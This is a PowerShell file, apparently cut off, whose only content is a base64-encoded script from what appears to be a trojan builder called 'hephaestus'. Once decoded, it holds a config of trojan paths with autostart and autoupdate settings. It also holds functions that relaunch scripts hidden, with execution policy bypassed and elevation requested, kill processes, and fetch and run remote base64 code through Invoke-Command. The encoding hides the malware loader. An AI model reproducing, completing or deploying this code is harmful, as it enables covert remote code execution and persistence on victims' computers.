
$xbody = "IyMjaGVhZA0KcGFyYW0oDQogICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JEZhbHNlLCBQb3NpdGlvbj0wLCBWYWx1ZUZyb21QaXBlbGluZT0kdHJ1ZSldDQogICAgW1N5c3RlbS5TdHJpbmddDQogICAgJFRhc2sNCikNCg0KJHNlcnZlciA9IEAnDQp7DQogICJ1cmxEb2MiOiAiIiwNCiAgImRpc2FibGVkIjogZmFsc2UsDQogICJkaXNhYmxlVmlydXMiOiBmYWxzZSwNCiAgImxhbmRpbmdBdXRvIjogZmFsc2UsDQogICJsYW5kaW5nTmFtZSI6ICJkZWZhdWx0IiwNCiAgInNvdXJjZUNlcnREaXIiOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXGNlcnQiLA0KICAicm9vdERpciI6ICJDOlxcMVxcaGVwaGFlc3R1cyIsDQogICJjcERpciI6ICJDOlxcMVxcaGVwaGFlc3R1c1xcY3AiLA0KICAiY2VydERpciI6ICJDOlxcMVxcaGVwaGFlc3R1c1xcY2VydCIsDQogICJwaHBEaXIiOiAiQzpcXDFcXGhlcGhhZXN0dXNcXHBocCIsDQogICJwaHBUZW1wbGF0ZUZpbGUiOiAiQzpcXDFcXGhlcGhhZXN0dXNcXHBocFxcLlxcZG4ucGhwIiwNCiAgInBocFRlbXBsYXRlU3BvbnNvckZpbGUiOiAiQzpcXDFcXGhlcGhhZXN0dXNcXHBocFxcLlxcZG93bmxvYWQucGhwIiwNCiAgImh0bWxUZW1wbGF0ZVNwb25zb3JGaWxlIjogIkM6XFwxXFxoZXBoYWVzdHVzXFxwaHBcXC5cXGRvd25sb2FkLmh0bWwiLA0KICAic3lzRGlyIjogIkM6XFwxXFxoZXBoYWVzdHVzXFxzeXMiLA0KICAidHJveWFuRGlyIjogIkM6XFwxXFxoZXBoYWVzdHVzXFx0cm95YW4iLA0KICAidHJveWFuU2NyaXB0RGlyIjogIkM6XFwxXFxoZXBoYWVzdHVzXFx0cm95YW5cXHRyb3lhbnBzIiwNCiAgInRyb3lhbk91dHB1dERpciI6ICJDOlxcMVxcaGVwaGFlc3R1c1xcdHJveWFuXFwuXFxfb3V0cHV0IiwNCiAgInRyb3lhbkV4ZSI6ICJDOlxcMVxcaGVwaGFlc3R1c1xcdHJveWFuXFwuXFxfb3V0cHV0XFx0cm95YW4uZXhlIiwNCiAgInRyb3lhbkljbyI6ICJDOlxcMVxcaGVwaGFlc3R1c1xcdHJveWFuXFwuXFxfb3V0cHV0XFx0cm95YW4uaWNvIiwNCiAgImJvZHkiOiAiQzpcXDFcXGhlcGhhZXN0dXNcXHRyb3lhblxcLlxcX291dHB1dFxcYm9keS50eHQiLA0KICAiYm9keVJlbGVhc2UiOiAiQzpcXDFcXGhlcGhhZXN0dXNcXHRyb3lhblxcLlxcX291dHB1dFxcYm9keS5yZWxlYXNlLnBzMSIsDQogICJib2R5RGVidWciOiAiQzpcXDFcXGhlcGhhZXN0dXNcXHRyb3lhblxcLlxcX291dHB1dFxcYm9keS5kZWJ1Zy5wczEiLA0KICAiaG9sZGVyIjogIkM6XFwxXFxoZXBoYWVzdHVzXFx0cm95YW5cXC5cXF9vdXRwdXRcXGhvbGRlci5wczEiLA0KICAiaG9sZGVyRGVidWciOiAiQzpcXDFcXGhlcGhhZXN0dXNcXHRyb3lhblxcLlxcX291dHB1dFxcaG9sZGVyLmRlYnVnLnBzMSIsDQogICJ1c2VyVHJveWFuRXhlIjogIkM6XFxkYXRhXFwxMjcuMC4wLjFcXHRyb3lhbi5leGUiLA0KICAidXNlclRyb3lhbkljbyI6ICJDOlxcZGF0YVxcMTI3LjAuMC4xXFx0cm95YW4uaWNvIiwNCiAgInRyb3lhblZic0RpciI6ICJDOlxcMVxcaGVwaGFlc3R1c1xcdHJveWFuXFx0cm95YW52YnMiLA0KICAidHJveWFuVmJzRmlsZSI6ICJDOlxcMVxcaGVwaGFlc3R1c1xcdHJveWFuXFwuXFxfb3V0cHV0XFx0cm95YW4udmJzIiwNCiAgInVzZXJWYnNGaWxlIjogIkM6XFxkYXRhXFwxMjcuMC4wLjFcXHRyb3lhbi52YnMiLA0KICAidXNlclZic0ZpbGVDbGVhbiI6ICJDOlxcZGF0YVxcMTI3LjAuMC4xXFx0cm95YW4uYy52YnMiLA0KICAiZGVmYXVsdEljbyI6ICJDOlxcMVxcaGVwaGFlc3R1c1xcZGVmYXVsdGljb24uaWNvIiwNCiAgInNlcnZlciI6ICIxMjcuMC4wLjEiLA0KICAidXNlckRhdGFEaXIiOiAiQzpcXGRhdGFcXDEyNy4wLjAuMSIsDQogICJ1c2VyU2VydmVyRmlsZSI6ICJDOlxcZGF0YVxcMTI3LjAuMC4xXFxzZXJ2ZXIuanNvbiIsDQogICJkblZic0xpbmtTaG9ydCI6ICIvZGVmYXVsdC9LS2dKSGhjdjRWL25vbmUvR2V0VmJzIiwNCiAgImRuVmJzTGluayI6ICJodHRwOi8vMTI3LjAuMC4xLy9kZWZhdWx0L21LM0ZKYlBTVmgvbm9uZS9HZXRWYnMiLA0KICAicGhwVmJzTGlua1Nob3J0IjogIi9kZWZhdWx0L0dldFZic1BocCIsDQogICJ1c2VyUGhwVmJzRmlsZSI6ICJDOlxcZGF0YVxcMTI3LjAuMC4xXFxkZWZhdWx0LnBocCIsDQogICJ1c2VyU3BvbnNvclBocFZic0ZpbGUiOiAiQzpcXGRhdGFcXDEyNy4wLjAuMVxcZGVmYXVsdC1zcG9uc29yLnBocCIsDQogICJ1c2VyU3BvbnNvckh0bWxWYnNGaWxlIjogIkM6XFxkYXRhXFwxMjcuMC4wLjFcXGRlZmF1bHQtc3BvbnNvci5odG1sIiwNCiAgInVzZXJQaHBFeGVGaWxlIjogIkM6XFxkYXRhXFwxMjcuMC4wLjFcXGRlZmF1bHQtZXhlLnBocCIsDQogICJ1c2VyU3BvbnNvclBocEV4ZUZpbGUiOiAiQzpcXGRhdGFcXDEyNy4wLjAuMVxcZGVmYXVsdC1zcG9uc29yLWV4ZS5waHAiLA0KICAidXNlclNwb25zb3JIdG1sRXhlRmlsZSI6ICJDOlxcZGF0YVxcMTI3LjAuMC4xXFxkZWZhdWx0LXNwb25zb3ItZXhlLmh0bWwiLA0KICAiZG93bmxvYWRJZGVudGlmaWVyIjogImRlZmF1bHQiLA0KICAidXBkYXRlVXJsIjogImh0dHA6Ly8xMjcuMC4wLjEvdXBkYXRlIiwNCiAgInVwZGF0ZVVybEZvbGRlciI6ICJodHRwOi8vMTI3LjAuMC4xL2RhdGEvIiwNCiAgInVwZGF0ZVVybEJsb2NrIjogImh0dHA6Ly8xMjcuMC4wLjEvZGF0YS9ibG9jay8iLA0KICAicHJpbWFyeURucyI6ICIxMjcuMC4wLjEiLA0KICAic2Vjb25kYXJ5RG5zIjogIjEyNy4wLjAuMSIsDQogICJ0cmFjayI6IGZhbHNlLA0KICAidHJhY2tEZXNrdG9wIjogZmFsc2UsDQogICJ0cmFja1VybCI6ICJodHRwOi8vMTI3LjAuMC4xL3Vwc2VydCIsDQogICJhdXRvU3RhcnQiOiB0cnVlLA0KICAiYXV0b1VwZGF0ZSI6IHRydWUsDQogICJkb21haW5JcHMiOiBbXSwNCiAgInB1c2hlc0ZvcmNlIjogdHJ1ZSwNCiAgInB1c2hlcyI6IFtdLA0KICAic3RhcnREb3dubG9hZHNGb3JjZSI6IGZhbHNlLA0KICAic3RhcnREb3dubG9hZHMiOiBbXSwNCiAgInN0YXJ0VXJsc0ZvcmNlIjogZmFsc2UsDQogICJzdGFydFVybHMiOiBbXSwNCiAgImZyb250Rm9yY2UiOiBmYWxzZSwNCiAgImZyb250IjogW10sDQogICJleHRyYWN0SWNvbkZyb21Gcm9udCI6IGZhbHNlLA0KICAiZW1iZWRkaW5nc0ZvcmNlIjogZmFsc2UsDQogICJlbWJlZGRpbmdzIjogW10sDQogICJpc1ZhbGlkIjogZmFsc2UsDQogICJleHRyYVVwZGF0ZSI6IGZhbHNlDQp9DQonQCB8IENvbnZlcnRGcm9tLUpzb24NCg0KDQogICAgICAgICR4ZGF0YSA9IEB7DQogICAgICAgIA0KICAgIH0NCiAgICAgICAgDQoNCiAgICAgICAgJHhmcm9udCA9IEAoDQogICAgICAgIA0KICAgICAgICApDQogICAgICAgICR4ZnJvbnRfbmFtZSA9IEAoDQogICAgICAgIA0KICAgICAgICApDQogICAgICAgICR4ZW1iZWQgPSBAKA0KICAgICAgICANCiAgICAgICAgKQ0KICAgICAgICAkeGVtYmVkX25hbWUgPSBAKA0KICAgICAgICANCiAgICAgICAgKQ0KDQpmdW5jdGlvbiBHZXQtU2NyaXB0UGF0aCB7DQogICAgJHNjcmlwdFBhdGhzID0gQCgNCiAgICAgICAgIyRNeUludm9jYXRpb24uTXlDb21tYW5kLkRlZmluaXRpb24sDQogICAgICAgICRQU0NvbW1hbmRQYXRoLA0KICAgICAgICAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5QYXRoDQogICAgKQ0KICAgIA0KICAgIGZvcmVhY2ggKCRwYXRoIGluICRzY3JpcHRQYXRocykgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkcGF0aCkgew0KICAgICAgICAgICAgICAgIHJldHVybiAkcGF0aA0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIHsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gSXNEZWJ1ZyB7DQogICAgJGRlYnVnRmlsZSA9ICJDOlxkZWJ1Zy50eHQiDQogICAgDQogICAgdHJ5IHsNCiAgICAgICAgIyBDaGVjayBpZiB0aGUgZmlsZSBleGlzdHMNCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkZGVidWdGaWxlIC1QYXRoVHlwZSBMZWFmKSB7DQogICAgICAgICAgICByZXR1cm4gJHRydWUNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICAjIENhdGNoIGFueSBlcnJvcnMgdGhhdCBvY2N1ciBkdXJpbmcgdGhlIFRlc3QtUGF0aCBvcGVyYXRpb24NCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCn0NCg0KJGdsb2JhbERlYnVnID0gSXNEZWJ1ZzsNCg0KZnVuY3Rpb24gd3JpdGVkYmcgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kbXNnLCAgIFtzdHJpbmddJG1zZzI9IiINCiAgICApDQogICAgICAgIGlmICgkZ2xvYmFsRGVidWcpew0KICAgICAgICAgICAgV3JpdGUtSG9zdCAkbXNnICsgJG1zZzINCiAgICAgICAgfQ0KfQ0KDQpmdW5jdGlvbiBVdGY4Tm9Cb20gew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kZGF0YSwNCiAgICAgICAgW3N0cmluZ10kZmlsZQ0KICAgICkNCiAgICAkc3RyZWFtV3JpdGVyID0gW1N5c3RlbS5JTy5TdHJlYW1Xcml0ZXJdOjpuZXcoJGZpbGUsICRmYWxzZSwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOCkNCiAgICAkc3RyZWFtV3JpdGVyLldyaXRlKCRkYXRhKQ0KICAgICRzdHJlYW1Xcml0ZXIuQ2xvc2UoKQ0KICAgICR3cml0dGVuQ29udGVudCA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkZmlsZSkNCiAgICBpZiAoJHdyaXR0ZW5Db250ZW50Lkxlbmd0aCAtZ2UgMyAtYW5kICR3cml0dGVuQ29udGVudFswXSAtZXEgMHhFRiAtYW5kICR3cml0dGVuQ29udGVudFsxXSAtZXEgMHhCQiAtYW5kICR3cml0dGVuQ29udGVudFsyXSAtZXEgMHhCRikgew0KICAgICAgICAkd3JpdHRlbkNvbnRlbnQgPSAkd3JpdHRlbkNvbnRlbnRbMy4uKCR3cml0dGVuQ29udGVudC5MZW5ndGggLSAxKV0NCiAgICB9DQogICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkZmlsZSwgJHdyaXR0ZW5Db250ZW50KQ0KfQ0KDQpmdW5jdGlvbiBHZXRVdGZOb0JvbSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRmaWxlDQogICAgKQ0KDQogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkZmlsZSkNCg0KICAgIGlmICgkY29udGVudEJ5dGVzLkxlbmd0aCAtZ2UgMyAtYW5kICRjb250ZW50Qnl0ZXNbMF0gLWVxIDB4RUYgLWFuZCAkY29udGVudEJ5dGVzWzFdIC1lcSAweEJCIC1hbmQgJGNvbnRlbnRCeXRlc1syXSAtZXEgMHhCRikgew0KICAgICAgICAkY29udGVudEJ5dGVzID0gJGNvbnRlbnRCeXRlc1szLi4oJGNvbnRlbnRCeXRlcy5MZW5ndGggLSAxKV0NCiAgICB9DQogICAgJGNvbnRlbnRXaXRob3V0Qm9tID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGNvbnRlbnRCeXRlcykNCg0KICAgIHJldHVybiAkY29udGVudFdpdGhvdXRCb20NCn0NCg0KZnVuY3Rpb24gR2V0LUhlcGhhZXN0dXNGb2xkZXIgew0KICAgICRhcHBEYXRhUGF0aCA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKQ0KICAgICRoZXBoYWVzdHVzRm9sZGVyID0gSm9pbi1QYXRoICRhcHBEYXRhUGF0aCAnSGVwaGFlc3R1cycNCiAgICByZXR1cm4gJGhlcGhhZXN0dXNGb2xkZXINCn0NCg0KZnVuY3Rpb24gR2V0LUhvbGRlclBhdGggew0KICAgICRoZXBoYWVzdHVzRm9sZGVyID0gR2V0LUhlcGhhZXN0dXNGb2xkZXINCiAgICAkc2NyaXB0TmFtZSA9ICdob2xkZXInICsgJy4nICsgJ3BzMScNCiAgICAkaG9sZGVyUGF0aCA9IEpvaW4tUGF0aCAkaGVwaGFlc3R1c0ZvbGRlciAtQ2hpbGRQYXRoICRzY3JpcHROYW1lDQogICAgcmV0dXJuICRob2xkZXJQYXRoDQp9DQoNCmZ1bmN0aW9uIEdldC1Tb21lUGF0aCB7DQogICAgJGhlcGhhZXN0dXNGb2xkZXIgPSBHZXQtSGVwaGFlc3R1c0ZvbGRlcg0KICAgICRzY3JpcHROYW1lID0gJ3NvbWUnICsgJy4nICsgJ3BzMScNCiAgICAkaG9sZGVyUGF0aCA9IEpvaW4tUGF0aCAkaGVwaGFlc3R1c0ZvbGRlciAtQ2hpbGRQYXRoICRzY3JpcHROYW1lDQogICAgcmV0dXJuICRob2xkZXJQYXRoDQp9DQoNCmZ1bmN0aW9uIEdldC1Cb2R5UGF0aCB7DQogICAgJGhlcGhhZXN0dXNGb2xkZXIgPSBHZXQtSGVwaGFlc3R1c0ZvbGRlcg0KICAgICRzY3JpcHROYW1lID0gJ2JvZHknICsgJy4nICsgJ3BzMScNCiAgICAkYm9keVBhdGggPSBKb2luLVBhdGggJGhlcGhhZXN0dXNGb2xkZXIgLUNoaWxkUGF0aCAkc2NyaXB0TmFtZQ0KICAgIHJldHVybiAkYm9keVBhdGgNCn0NCg0KZnVuY3Rpb24gRXh0cmFjdEVtYmVkZGluZyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRpbkNvbnRlbnQsDQogICAgICAgIFtzdHJpbmddJG91dEZpbGUNCiAgICApDQogICAgJGRlY29kZWRCeXRlcyA9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkaW5Db250ZW50KQ0KICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJG91dEZpbGUsICRkZWNvZGVkQnl0ZXMpDQp9DQoNCmZ1bmN0aW9uIFRlc3QtQXJneyBwYXJhbSAoW3N0cmluZ10kYXJnKQ0KICAgICRnbG9iYWxBcmdzID0gJGdsb2JhbDphcmdzIC1qb2luICcgJw0KICAgIGlmICgkZ2xvYmFsQXJncyAtbGlrZSAiKiRhcmcqIikgew0KICAgICAgICByZXR1cm4gJHRydWUNCiAgICB9DQogICAgcmV0dXJuICRmYWxzZQ0KfSANCg0KZnVuY3Rpb24gR2V0LUFyZ3VtZW50VmFsdWUgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRhcmdOYW1lDQogICAgKQ0KICAgICRhcmdzWCA9ICRnbG9iYWw6YXJncw0KICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGFyZ3NYLkxlbmd0aDsgJGkrKykgew0KICAgICAgICBpZiAoJGFyZ3NYWyRpXSAtZXEgJGFyZ05hbWUpIHsNCiAgICAgICAgICAgIHJldHVybiAkYXJnc1hbJGkgKyAxXQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAiIiAgIyBSZXR1cm4gbnVsbCBpZiB0aGUgYXJndW1lbnQgd2FzIG5vdCBmb3VuZA0KfQ0KDQpmdW5jdGlvbiBUZXN0LUF1dG9zdGFydCANCnsNCiAgICByZXR1cm4gVGVzdC1BcmcgLWFyZyAiYXV0b3N0YXJ0Ig0KfQ0KDQoNCmZ1bmN0aW9uIFJ1bk1lIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHNjcmlwdCwgDQogICAgICAgIFtzdHJpbmddJGFyZywNCiAgICAgICAgW2Jvb2xdJHVhYw0KICAgICkNCg0KICAgIHRyeSANCiAgICB7DQogICAgICAgICRzY3JpcHRQYXRoID0gJHNjcmlwdA0KICAgICAgICANCiAgICAgICAgJGxvY2FsQXJndW1lbnRzID0gQCgiLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MiKQ0KICAgICAgICANCiAgICAgICAgJGdsb2JhbEFyZ3MgPSAkZ2xvYmFsOmFyZ3MNCiAgICAgICAgZm9yZWFjaCAoJGdsb2JhbEFyZyBpbiAkZ2xvYmFsQXJncykgew0KICAgICAgICAgICAgJGxvY2FsQXJndW1lbnRzICs9ICItQXJndW1lbnQgYCIkZ2xvYmFsQXJnYCIiDQogICAgICAgIH0NCg0KICAgICAgICBpZiAoLW5vdCBbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkYXJnKSkgew0KICAgICAgICAgICAgJGxvY2FsQXJndW1lbnRzICs9ICItJGFyZyINCiAgICAgICAgfQ0KDQogICAgICAgICRsb2NhbEFyZ3VtZW50TGlzdCA9IEAoIi1GaWxlIiwgImAiJHNjcmlwdFBhdGhgIiIpICsgJGxvY2FsQXJndW1lbnRzDQogICAgICAgIA0KICAgICAgICBpZiAoJHVhYyAtZXEgJHRydWUpIHsNCiAgICAgICAgICAgICRhcmcgPSAiLSRhcmciDQogICAgICAgICAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLUFyZ3VtZW50TGlzdCAiLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSBgIiRzY3JpcHRQYXRoYCIgJGFyZyAtVmVyYm9zZSIgLVZlcmIgUnVuQXMgLVdpbmRvd1N0eWxlIEhpZGRlbg0KDQogICAgICAgICAgICAjJGNtZD0iU3RhcnQtUHJvY2VzcyBQb3dlcnNoZWxsIC1WZXJiIFJ1bkFzIC1XYWl0IC1Bcmd1bWVudExpc3QgJy1Ob1Byb2ZpbGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSBgIiRzY3JpcHRQYXRoYCIgLSRhcmcnIg0KICAgICAgICAgICAjIHBvd2Vyc2hlbGwgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgJGNtZA0KICAgICAgICAgIyAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbC5leGUgLUFyZ3VtZW50TGlzdCAkbG9jYWxBcmd1bWVudExpc3QgLVZlcmIgUnVuQXMgLVdpbmRvd1N0eWxlIEhpZGRlbg0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtQXJndW1lbnRMaXN0ICRsb2NhbEFyZ3VtZW50TGlzdCAtV2luZG93U3R5bGUgSGlkZGVuDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICAgIHdyaXRlZGJnICJSdW5NZSAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIElzRWxldmF0ZWQNCnsNCiAgICBpZiAoLU5PVCAoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSkNCiAgICB7DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQogICAgcmV0dXJuICR0cnVlDQp9DQoNCg0KZnVuY3Rpb24gR2V0LUVudlBhdGhzIHsNCiAgICAkYSA9IEdldC1Mb2NhbEFwcERhdGFQYXRoDQogICAgJGIgPSAgR2V0LUFwcERhdGFQYXRoDQogICAgcmV0dXJuIEAoJGEgLCAkYikNCn0NCg0KZnVuY3Rpb24gR2V0LVRlbXBGaWxlIHsNCiAgICAkdGVtcFBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wUGF0aCgpDQogICAgJHRlbXBGaWxlID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcEZpbGVOYW1lKCkNCiAgICByZXR1cm4gJHRlbXBGaWxlDQp9DQoNCmZ1bmN0aW9uIEdldC1Mb2NhbEFwcERhdGFQYXRoIHsNCiAgICByZXR1cm4gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW1N5c3RlbS5FbnZpcm9ubWVudCtTcGVjaWFsRm9sZGVyXTo6TG9jYWxBcHBsaWNhdGlvbkRhdGEpDQp9DQoNCmZ1bmN0aW9uIEdldC1BcHBEYXRhUGF0aCB7DQogICAgcmV0dXJuIFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKFtTeXN0ZW0uRW52aXJvbm1lbnQrU3BlY2lhbEZvbGRlcl06OkFwcGxpY2F0aW9uRGF0YSkNCn0NCg0KZnVuY3Rpb24gR2V0LVByb2ZpbGVQYXRoIHsNCiAgICByZXR1cm4gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW1N5c3RlbS5FbnZpcm9ubWVudCtTcGVjaWFsRm9sZGVyXTo6VXNlclByb2ZpbGUpDQp9DQoNCmZ1bmN0aW9uIENsb3NlLVByb2Nlc3NlcyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nW11dJHByb2Nlc3Nlcw0KICAgICkNCg0KICAgIGZvcmVhY2ggKCRwcm9jZXNzIGluICRQcm9jZXNzZXMpIHsNCiAgICAgICAgJGNvbW1hbmQgPSAidGFza2tpbGwuZXhlIC9pbSAkcHJvY2VzcyAvZiINCiAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gJGNvbW1hbmQNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1UZW1wUHMgew0KICAgICMgR2VuZXJhdGUgYSB1bmlxdWUgdGVtcG9yYXJ5IGZpbGUgbmFtZSBpbiB0aGUgdGVtcCBkaXJlY3RvcnkNCiAgICAkdGVtcEZpbGUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KDQogICAgIyBDaGFuZ2UgdGhlIGZpbGUgZXh0ZW5zaW9uIHRvIC5wczENCiAgICAkcHMxVGVtcEZpbGUgPSBbU3lzdGVtLklPLlBhdGhdOjpDaGFuZ2VFeHRlbnNpb24oJHRlbXBGaWxlLCAiLnBzMSIpDQoNCiAgICByZXR1cm4gJHBzMVRlbXBGaWxlDQp9DQoNCiMgbmV2ZXIgY2hhbmdlIGRlZiB2YWx1ZXMNCmZ1bmN0aW9uIFJ1blJlbW90ZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRiYXNlVXJsLA0KICAgICAgICBbc3RyaW5nXSRibG9jaywNCiAgICAgICAgW3N0cmluZ10kcGFyYW0gPSAkbnVsbCwNCiAgICAgICAgW2Jvb2xdJGlzV2FpdCA9ICR0cnVlLA0KICAgICAgICBbYm9vbF0kaXNKb2IgPSAkZmFsc2UNCiAgICApDQogICAgJGNtZCA9ICJkb18kYmxvY2siDQogICAgaWYgKCRwYXJhbSAtbmUgJG51bGwpDQogICAgew0KICAgICAgICAkY21kICs9ICIgLXBhcmFtICckcGFyYW0nIg0KICAgIH0NCiAgICAkdXJsID0gIiRiYXNlVXJsJGJsb2NrLnR4dCINCiAgICAkdGltZW91dCA9IFtkYXRldGltZV06OlV0Y05vdy5BZGRNaW51dGVzKDUpDQogICAgJGRlbGF5ID0gMTANCiAgICB3aGlsZSAoW2RhdGV0aW1lXTo6VXRjTm93IC1sdCAkdGltZW91dCkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJHJlc3BvbnNlID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJsIC1Vc2VCYXNpY1BhcnNpbmcgLU1ldGhvZCBHZXQNCiAgICAgICAgICAgIGlmICgkcmVzcG9uc2UuU3RhdHVzQ29kZSAtZXEgMjAwKSB7DQogICAgICAgICAgICAgICAgJHNjcmlwdERhdGEgPSAkcmVzcG9uc2UuQ29udGVudA0KICAgICAgICAgICAgICAgICRzY3JpcHREYXRhID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRzY3JpcHREYXRhKSkgKyAiYG5gbiIgKyAkY21kDQogICAgICAgICAgICAgICAgaWYgKCRnbG9iYWxEZWJ1ZykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICAgICBVdGY4Tm9Cb20gLWRhdGEgJHNjcmlwdERhdGEgLWZpbGUgIkM6XFNvZnRcaGVwaGFlc3R1c1x0cm95YW5cX291dHB1dFxfdGVtcF8kYmxvY2sucHMxIiAgICAgIA0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGNvZGVCbG9jayA9IFtTY3JpcHRCbG9ja106OkNyZWF0ZSgkc2NyaXB0RGF0YSkNCiAgICAgICAgICAgICAgICBpZiAoJGlzSm9iKSB7DQogICAgICAgICAgICAgICAgICAgICRnZW5lcmFsSm9iID0gU3RhcnQtSm9iIC1TY3JpcHRCbG9jayAkY29kZUJsb2NrDQogICAgICAgICAgICAgICAgICAgIGlmICgkaXNXYWl0KSB7DQogICAgICAgICAgICAgICAgICAgICAgICBXYWl0LUpvYiAtSm9iICRnZW5lcmFsSm9iIC1UaW1lb3V0IDMwMCB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGdlbmVyYWxKb2IuU3RhdGUgLWVxICdDb21wbGV0ZWQnKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9IFJlY2VpdmUtSm9iIC1Kb2IgJGdlbmVyYWxKb2INCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZW1vdmUtSm9iIC1Kb2IgJGdlbmVyYWxKb2INCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHJlc3VsdA0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZWRiZyAiSm9iIGRpZCBub3QgY29tcGxldGUgd2l0aGluIHRoZSB0aW1lb3V0IHBlcmlvZC4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3ZlLUpvYiAtSm9iICRnZW5lcmFsSm9iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRjb2RlQmxvY2sgPSBbU2NyaXB0QmxvY2tdOjpDcmVhdGUoJHNjcmlwdERhdGEpDQogICAgICAgICAgICAgICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkY29kZUJsb2NrDQogICAgICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICB3cml0ZWRiZyAiRmFpbGVkIHRvIHJ1bnJlbW90ZSAkdXJsICRfIg0KICAgICAgICB9IA0KICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXkNCiAgICB9IA0KICAgIHdyaXRlZGJnICJGYWlsZWQgdG8gcnVuIHJlbW90ZSAkdXJsIHdpdGhpbiB